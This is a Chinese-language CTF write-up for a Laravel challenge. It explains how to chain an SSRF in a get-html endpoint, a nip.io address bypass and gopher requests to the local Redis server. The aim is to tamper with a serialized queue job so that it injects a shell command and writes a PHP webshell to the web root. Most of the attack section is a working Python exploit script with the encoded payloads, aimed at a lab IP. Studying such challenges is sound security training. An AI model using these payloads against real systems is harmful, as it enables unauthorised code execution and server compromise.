这道题的gethtml功能有ssrf的功能点：
```php
class SiteShotController extends Controller
{
    public function getHtml(Request $request)
    {
        $site = $request->input('site');

        if (!$this->validateurl($site)) {
            return  response()->json([
                'status' => 'failed',
                'message' => 'Dont do naughty stuff.'
            ]);
        }

        if (!isset($site)) {
            return response()->json([
                'status' => 'failed',
                'message' => 'Need site parameter'
            ]);
        }

        $ssSrv = new SiteShotService();

        return $ssSrv->getHtmlResp($site);
    }
```
$ssSrv->getHtmlResp用了curl
在靶机的环境中是可以用gopher协议等等去打的
但是要绕过validateurl的校验，这个函数不允许传入本地ipv4地址或者不正常的域名（只能包含数字和-）
但是可以dns重绑定绕过这个校验，可以用nip.io这个已经预设的域名，相当强大，通过一定结构的域名可以指向任何ip


在给的附件里面的.env还可以发现跑着redis服务，redis服务是用来存储任务队列的。即filequeue


主要是下面的代码
```php
 $rf = new rmFile($filequeue);
            Queue::push($rf);
```

框架会对filequeue序列化并且转化为json格式放入redis的laravel_database_queues:default中（键名），对每一个队列中的任务执行rmfile的handle方法
即fileQueue->deleteFile();
deletefile用的是filequeue对象的uuid和txt属性去拼接一个filepath，但是实际上ssrf后uuid是可控的，因为要从redis中反序列化出这个字段，而我们是可以通过ssrf
去修改laravel_database_queues:default中相应索引的任务的属性来劫持反序列化的属性的，然后控制传入 system("rm ".$filepath);的filepath参数，从而写入php shell

网上的redis攻击方法说的改config是不行的，config在高版本上了包含，dir切换不了，运行阶段是无法关闭保护的
可以先用在框里面输入dict://test.127-0-0-1.nip.io:6379/info然后gethtml来测试redis联通性
联通后用下面的脚本去打：

```python
import html.entities
import urllib.parse
import requests
import json
import logging
s=r'{"uuid":"1c0d0b12-641d-49ae-a8f6-5f342fa91e22","displayName":"App\\Jobs\\rmFile","job":"Illuminate\\Queue\\CallQueuedHandler@call","maxTries":null,"maxExceptions":null,"failOnTimeout":false,"backoff":null,"timeout":null,"retryUntil":null,"data":{"commandName":"App\\Jobs\\rmFile","command":"O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:35:\"$(touch /www/public/shell.php).txt;\";s:4:\"uuid\";s:66:\"404;echo \"<?php eval(\\$_GET[0])>\" > /www/public/shell.php;touch aa\";s:3:\"ext\";s:3:\"txt\";}}"},"id":"kFmxDNJFXkM5ZFNBXWZdUfVUknKQoksy","attempts":0}'#要改uuid成别的的话自己修正一下uuid的长度，把s:66改成别的
objlen=len(s)
htmlencode=urllib.parse.quote(s)
print(htmlencode)
ssrf=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*4\n$4\nlset\n$31\nlaravel_database_queues:default\n$1\n0\n${}\n{}\n".format(objlen,htmlencode).replace(r"\n",r"%0d%0a")+r"*1%0d%0a%244%0d%0aquit%0d%0a"))
d=r"dict://127-0-0-1.nip.io:6379/flushall"
show=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*3\n$6\nlindex\n$31\nlaravel_database_queues:default\n$1\n0\n".replace(r"\n",r"%0d%0a")+r"*1%0d%0a%244%0d%0aquit%0d%0a"))
print(ssrf)
flush=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*1\n$8\nflushall\n".replace(r"\n",r"%0d%0a")+r"*1%0d%0a%244%0d%0aquit%0d%0a"))
test=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*4\n$4\nlset\n$31\nlaravel_database_queues:default\n$1\n0\n$554\n%7b%22uuid%22%3a%22812d6caf-9d25-42cd-893c-7696a493524d%22%2c%22displayName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22job%22%3a%22Illuminate%5c%5cQueue%5c%5cCallQueuedHandler%40call%22%2c%22maxTries%22%3anull%2c%22maxExceptions%22%3anull%2c%22failOnTimeout%22%3afalse%2c%22backoff%22%3anull%2c%22timeout%22%3anull%2c%22retryUntil%22%3anull%2c%22data%22%3a%7b%22commandName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22command%22%3a%22O%3a15%3a%5c%22App%5c%5cJobs%5c%5crmFile%5c%22%3a1%3a%7bs%3a9%3a%5c%22fileQueue%5c%22%3bO%3a21%3a%5c%22App%5c%5cMessage%5c%5cFileQueue%5c%22%3a3%3a%7bs%3a8%3a%5c%22filePath%5c%22%3bs%3a45%3a%5c%22%5c%2fsrc%5c%2f1356bb54-1c72-40fe-93ed-78fd5907af51.txt%5c%22%3bs%3a4%3a%5c%22uuid%5c%22%3bs%3a1%3a%5c%221%5c%22%3bs%3a3%3a%5c%22ext%5c%22%3bs%3a3%3a%5c%22txt%5c%22%3b%7d%7d%22%7d%2c%22id%22%3a%22SZ9ZKmfSw3zicR6kc9nvKTwL495P2iUN%22%2c%22attempts%22%3a0%7d\n".replace(r"\n",r"%0d%0a").replace("+","%20")+r"*1%0d%0a%244%0d%0aquit%0d%0a"))
url="http://192.168.205.128:1337/api/get-html"#改一下ip和端口
html="https://www.google.com/"
a=requests.post(url,data={"site":ssrf})
print(a.text)
b=requests.get("http://192.168.205.128:1337"+a.json()["filename"]) #改一下ip和端口
print(b.text)
```